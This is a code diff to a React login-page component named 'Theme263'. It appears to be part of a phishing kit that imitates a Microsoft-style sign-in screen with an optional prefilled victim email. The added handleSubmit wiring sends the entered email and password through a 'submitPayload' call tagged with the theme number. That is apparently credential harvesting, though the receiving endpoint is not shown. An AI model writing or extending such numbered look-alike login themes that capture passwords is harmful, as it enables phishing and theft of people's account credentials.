@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useSecurity } from '../components/SecurityManager';
 
 interface Theme263Props {
   prefilledEmail?: string;
@@ -9,6 +10,21 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
   const [email, setEmail] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'user' | 'admin'>('user');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email, password }, '263');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#333]">
@@ -93,7 +109,7 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
           </div>
 
           {/* Form Content */}
-          <div className="p-8 space-y-5">
+          <form onSubmit={handleSubmit} className="p-8 space-y-5">
             <div className="relative">
               <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-300">
                 <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
@@ -129,11 +145,15 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
                 <input type="checkbox" className="mr-1 rounded border-gray-300 text-blue-500" />
                 Security Login
               </label>
-              <button className="hover:underline">Clear Trace</button>
+              <button type="button" className="hover:underline">Clear Trace</button>
             </div>
 
-            <button className="w-full py-2 bg-[#0078d7] text-white font-medium rounded hover:bg-[#006cc7] transition-colors shadow-sm">
-              Sign in
+            <button 
+              type="submit"
+              disabled={isSubmitting}
+              className="w-full py-2 bg-[#0078d7] text-white font-medium rounded hover:bg-[#006cc7] transition-colors shadow-sm disabled:opacity-70"
+            >
+              {isSubmitting ? '...' : 'Sign in'}
             </button>
 
             <div className="flex items-center justify-between pt-2 border-t border-gray-50 text-[11px]">
@@ -142,7 +162,7 @@ const Theme263: React.FC<Theme263Props> = ({ prefilledEmail }) => {
                   Language <span className="ml-1 scale-75">▼</span>
                </div>
             </div>
-          </div>
+          </form>
         </div>
       </main>
 
